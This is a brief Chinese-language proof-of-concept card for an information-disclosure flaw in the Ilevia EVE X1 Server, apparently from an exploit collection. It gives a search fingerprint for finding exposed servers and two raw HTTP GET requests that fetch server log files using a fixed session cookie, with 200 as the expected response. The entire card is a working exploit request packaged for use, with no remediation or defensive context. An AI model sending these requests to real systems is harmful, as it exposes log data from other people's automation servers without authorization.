# IleviaEVEX1Servereveserver存在信息泄露漏洞

- **系统**：IleviaEVEX1Servereveserver　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app="ilevia-EVE-X1-Server"`
- **请求**：`GET /80-history/eve-server.log HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=u477ikovcc936bdor4ernlmt1r`

**请求体 / payload**
```
Poc2
GET /80-history/eve.log HTTP/1.1
Host:
Cookie: PHPSESSID=u477ikovcc936bdor4ernlmt1r
```
- **预期**：200　|　—